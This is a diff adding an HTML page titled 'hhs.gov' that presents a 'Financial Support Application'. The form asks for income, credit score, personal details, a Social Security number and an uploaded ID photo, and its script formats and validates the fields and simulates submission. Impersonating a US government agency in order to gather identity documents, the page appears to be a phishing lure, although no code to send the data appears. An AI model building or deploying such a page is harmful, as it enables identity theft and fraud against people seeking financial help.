@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" integrity="sha384-tViUnnbYAV00FLIhhi3v/dWt3Jxw4gZQcNoSCxCIFNJVCx7/D55/wXsrNIRANwdD" crossorigin="anonymous">
+      <link rel="shortcut icon" href="css/image/logo-desktop.svg" type="image/x-icon">
+      <link rel="stylesheet" href="css/form.css">
+    <title>hhs.gov</title>
+</head>
+<body>
+        <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>Financial Support Application</h1>
+            <p id="categoryDisplay">Loading...</p>
+        </div>
+
+        <!-- Form -->
+        <form id="applicationForm">
+            <!-- Section 1: Funding Information -->
+            <div class="form-section section-1">
+                <div class="section-header">
+                    <div class="section-title">
+                        <div class="section-number">1</div>
+                        Funding Information
+                    </div>
+                </div>
+                <div class="section-content">
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label class="form-label" for="estimatedAmount">Estimated Amount Needed *</label>
+                            <input type="text" id="estimatedAmount" class="form-input" placeholder="$0" required>
+                            <div class="error-message" id="estimatedAmount-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="moneyFor">What is the money for? *</label>
+                            <input type="text" id="moneyFor" class="form-input" placeholder="Purpose of funding" required>
+                            <div class="error-message" id="moneyFor-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="employmentStatus">Current Employment Status *</label>
+                            <select id="employmentStatus" class="form-select" required>
+                                <option value="">Select employment status</option>
+                                <option value="employed">Employed</option>
+                                <option value="self-employed">Self-Employed</option>
+                                <option value="unemployed">Unemployed</option>
+                                <option value="student">Student</option>
+                                <option value="retired">Retired</option>
+                            </select>
+                            <div class="error-message" id="employmentStatus-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="annualIncome">Annual Income *</label>
+                            <input type="text" id="annualIncome" class="form-input" placeholder="$0" required>
+                            <div class="error-message" id="annualIncome-error"></div>
+                        </div>
+
+                        <div class="form-group form-grid-full">
+                            <label class="form-label" for="creditScore">Credit Score *</label>
+                            <select id="creditScore" class="form-select" required>
+                                <option value="">Select credit score range</option>
+                                <option value="poor">Poor (300-579)</option>
+                                <option value="fair">Fair (580-669)</option>
+                                <option value="good">Good (670-739)</option>
+                                <option value="excellent">Excellent (740-850)</option>
+                            </select>
+                            <div class="error-message" id="creditScore-error"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 2: Personal Information -->
+            <div class="form-section section-2">
+                <div class="section-header">
+                    <div class="section-title">
+                        <div class="section-number">2</div>
+                        Personal Information
+                    </div>
+                </div>
+                <div class="section-content">
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label class="form-label" for="firstName">First Name *</label>
+                            <input type="text" id="firstName" class="form-input" required>
+                            <div class="error-message" id="firstName-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="lastName">Last Name *</label>
+                            <input type="text" id="lastName" class="form-input" required>
+                            <div class="error-message" id="lastName-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="dateOfBirth">Date of Birth *</label>
+                            <input type="date" id="dateOfBirth" class="form-input" required>
+                            <div class="error-message" id="dateOfBirth-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="phoneNumber">Phone Number *</label>
+                            <input type="tel" id="phoneNumber" class="form-input" placeholder="(555) 123-4567" required>
+                            <div class="error-message" id="phoneNumber-error"></div>
+                        </div>
+
+                        <div class="form-group form-grid-full">
+                            <label class="form-label" for="streetAddress">Street Address *</label>
+                            <input type="text" id="streetAddress" class="form-input" required>
+                            <div class="error-message" id="streetAddress-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="city">City *</label>
+                            <input type="text" id="city" class="form-input" required>
+                            <div class="error-message" id="city-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="state">State *</label>
+                            <input type="text" id="state" class="form-input" required>
+                            <div class="error-message" id="state-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="zipCode">Zip Code *</label>
+                            <input type="text" id="zipCode" class="form-input" required>
+                            <div class="error-message" id="zipCode-error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label" for="ssn">Social Security Number *</label>
+                            <input type="text" id="ssn" class="form-input" placeholder="***-**-1234" required>
+                            <div class="error-message" id="ssn-error"></div>
+                        </div>
+
+                        <div class="form-group form-grid-full">
+                            <label class="form-label">Do you rent or own your home? *</label>
+                            <div class="radio-group">
+                                <div class="radio-item">
+                                    <input type="radio" id="rent" name="homeOwnership" value="rent" class="radio-input" required>
+                                    <label for="rent">Rent</label>
+                                </div>
+                                <div class="radio-item">
+                                    <input type="radio" id="own" name="homeOwnership" value="own" class="radio-input" required>
+                                    <label for="own">Own</label>
+                                </div>
+                            </div>
+                            <div class="error-message" id="homeOwnership-error"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 3: Identity Verification -->
+            <div class="form-section section-3">
+                <div class="section-header">
+                    <div class="section-title">
+                        <div class="section-number">3</div>
+                        Identity Verification
+                    </div>
+                </div>
+                <div class="section-content">
+                    <div class="form-group">
+                        <label class="form-label">Upload a Clear Photo of Your ID Card or Driver's License *</label>
+                        <div class="file-upload-area" id="fileUploadArea">
+                            <input type="file" id="idUpload" accept="image/*" style="display: none;" required>
+                            <div id="uploadContent">
+                                <svg class="upload-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
+                                </svg>
+                                <p>Click to upload your ID</p>
+                                <p style="font-size: 0.75rem; color: #9ca3af; margin-top: 0.25rem;">PNG, JPG up to 5MB</p>
+                            </div>
+                            <div id="uploadSuccess" style="display: none;">
+                                <svg style="width: 1.5rem; height: 1.5rem; color: #10b981; margin-bottom: 0.5rem;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                <p style="color: #059669; font-weight: 500;">ID uploaded successfully</p>
+                            </div>
+                        </div>
+                        <div class="error-message" id="idUpload-error"></div>
+                        <div class="file-preview" id="filePreview" style="display: none;">
+                            <img id="previewImage" alt="ID Preview">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="submit-section">
+                <button type="submit" class="submit-button" id="submitButton">
+                    Submit Application
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        class ApplicationForm {
+            constructor() {
+                this.form = document.getElementById('applicationForm');
+                this.submitButton = document.getElementById('submitButton');
+                this.fileUpload = document.getElementById('idUpload');
+                this.fileUploadArea = document.getElementById('fileUploadArea');
+                this.categoryDisplay = document.getElementById('categoryDisplay');
+                
+                this.initializeForm();
+                this.setupEventListeners();
+                this.loadCategoryFromURL();
+            }
+
+            initializeForm() {
+                // Format currency inputs
+                ['estimatedAmount', 'annualIncome'].forEach(id => {
+                    const input = document.getElementById(id);
+                    input.addEventListener('input', (e) => this.formatCurrency(e.target));
+                });
+
+                // Format phone number
+                const phoneInput = document.getElementById('phoneNumber');
+                phoneInput.addEventListener('input', (e) => this.formatPhone(e.target));
+
+                // Format SSN
+                const ssnInput = document.getElementById('ssn');
+                ssnInput.addEventListener('input', (e) => this.formatSSN(e.target));
+            }
+
+            setupEventListeners() {
+                this.form.addEventListener('submit', (e) => this.handleSubmit(e));
+                this.fileUploadArea.addEventListener('click', () => this.fileUpload.click());
+                this.fileUpload.addEventListener('change', (e) => this.handleFileUpload(e));
+
+                // Clear errors on input
+                this.form.addEventListener('input', (e) => this.clearError(e.target));
+                this.form.addEventListener('change', (e) => this.clearError(e.target));
+            }
+
+            loadCategoryFromURL() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const category = urlParams.get('category') || 'Financial Support';
+                this.categoryDisplay.textContent = category;
+                document.getElementById('moneyFor').value = category;
+            }
+
+            formatCurrency(input) {
+                const value = input.value.replace(/[^\d]/g, '');
+                if (value) {
+                    const formatted = new Intl.NumberFormat('en-US', {
+                        style: 'currency',
+                        currency: 'USD',
+                        minimumFractionDigits: 0,
+                        maximumFractionDigits: 0
+                    }).format(parseInt(value));
+                    input.value = formatted;
+                } else {
+                    input.value = '';
+                }
+            }
+
+            formatPhone(input) {
+                const value = input.value.replace(/[^\d]/g, '');
+                if (value.length >= 10) {
+                    input.value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
+                } else {
+                    input.value = value;
+                }
+            }
+
+            formatSSN(input) {
+                const value = input.value.replace(/[^\d]/g, '');
+                if (value.length >= 9) {
+                    input.value = `***-**-${value.slice(-4)}`;
+                } else {
+                    input.value = value;
+                }
+            }
+
+            handleFileUpload(event) {
+                const file = event.target.files[0];
+                if (!file) return;
+
+                if (file.size > 5 * 1024 * 1024) {
+                    this.showToast('File too large', 'Please upload an image smaller than 5MB', 'error');
+                    return;
+                }
+
+                if (!file.type.startsWith('image/')) {
+                    this.showToast('Invalid file type', 'Please upload an image file', 'error');
+                    return;
+                }
+
+                // Show success state
+                this.fileUploadArea.classList.add('success');
+                document.getElementById('uploadContent').style.display = 'none';
+                document.getElementById('uploadSuccess').style.display = 'block';
+
+                // Show preview
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const preview = document.getElementById('filePreview');
+                    const img = document.getElementById('previewImage');
+                    img.src = e.target.result;
+                    preview.style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+
+                this.clearError(this.fileUpload);
+            }
+
+            validateForm() {
+                const errors = {};
+                const requiredFields = [
+                    'estimatedAmount', 'moneyFor', 'employmentStatus', 'annualIncome', 'creditScore',
+                    'firstName', 'lastName', 'dateOfBirth', 'streetAddress', 'city', 'state',
+                    'zipCode', 'ssn', 'phoneNumber'
+                ];
+
+                requiredFields.forEach(field => {
+                    const element = document.getElementById(field);
+                    if (!element.value.trim()) {
+                        errors[field] = 'This field is required';
+                    }
+                });
+
+                // Validate home ownership radio buttons
+                const homeOwnership = document.querySelector('input[name="homeOwnership"]:checked');
+                if (!homeOwnership) {
+                    errors['homeOwnership'] = 'Please select an option';
+                }
+
+                // Validate phone format
+                const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/;
+                const phoneValue = document.getElementById('phoneNumber').value;
+                if (phoneValue && !phoneRegex.test(phoneValue)) {
+                    errors['phoneNumber'] = 'Invalid phone format';
+                }
+
+                // Validate file upload
+                if (!this.fileUpload.files[0]) {
+                    errors['idUpload'] = 'ID upload is required';
+                }
+
+                return errors;
+            }
+
+            showErrors(errors) {
+                Object.keys(errors).forEach(field => {
+                    const errorElement = document.getElementById(`${field}-error`);
+                    const inputElement = document.getElementById(field) || document.querySelector(`input[name="${field}"]`);
+                    
+                    if (errorElement) {
+                        errorElement.textContent = errors[field];
+                    }
+                    
+                    if (inputElement) {
+                        inputElement.classList.add('error');
+                    }
+
+                    if (field === 'idUpload') {
+                        this.fileUploadArea.classList.add('error');
+                    }
+                });
+            }
+
+            clearError(element) {
+                const fieldName = element.name || element.id;
+                const errorElement = document.getElementById(`${fieldName}-error`);
+                
+                if (errorElement) {
+                    errorElement.textContent = '';
+                }
+                
+                element.classList.remove('error');
+
+                if (fieldName === 'idUpload') {
+                    this.fileUploadArea.classList.remove('error');
+                }
+            }
+
+            async handleSubmit(event) {
+                event.preventDefault();
+
+                const errors = this.validateForm();
+                
+                // Clear previous errors
+                document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
+                document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
+                this.fileUploadArea.classList.remove('error');
+
+                if (Object.keys(errors).length > 0) {
+                    this.showErrors(errors);
+                    this.showToast('Please correct the errors', 'Some required fields are missing or invalid', 'error');
+                    return;
+                }
+
+                // Show loading state
+                this.submitButton.disabled = true;
+                this.submitButton.innerHTML = '<span class="loading-spinner"></span>Submitting...';
+
+                // Simulate form submission
+                try {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    this.showToast(
+                        'Application Submitted Successfully!',
+                        'Thank you! Your application has been submitted. We will contact you shortly.',
+                        'success'
+                    );
+
+                    // Reset form after successful submission
+                    setTimeout(() => {
+                        this.form.reset();
+                        this.resetFileUpload();
+                    }, 3000);
+
+                } catch (error) {
+                    this.showToast('Submission Failed', 'Please try again later', 'error');
+                } finally {
+                    this.submitButton.disabled = false;
+                    this.submitButton.innerHTML = 'Submit Application';
+                }
+            }
+
+            resetFileUpload() {
+                this.fileUploadArea.classList.remove('success');
+                document.getElementById('uploadContent').style.display = 'block';
+                document.getElementById('uploadSuccess').style.display = 'none';
+                document.getElementById('filePreview').style.display = 'none';
+            }
+
+            showToast(title, description, type = 'success') {
+                // Remove existing toasts
+                const existingToasts = document.querySelectorAll('.toast');
+                existingToasts.forEach(toast => toast.remove());
+
+                const toast = document.createElement('div');
+                toast.className = `toast ${type}`;
+                toast.innerHTML = `
+                    <div class="toast-title">${title}</div>
+                    <div class="toast-description">${description}</div>
+                `;
+
+                document.body.appendChild(toast);
+
+                // Show toast
+                setTimeout(() => toast.classList.add('show'), 100);
+
+                // Hide toast after 5 seconds
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                    setTimeout(() => toast.remove(), 300);
+                }, 5000);
+            }
+        }
+
+        // Initialize the form when the page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            new ApplicationForm();
+        });
+    </script>
+    
+</body>
+</html>
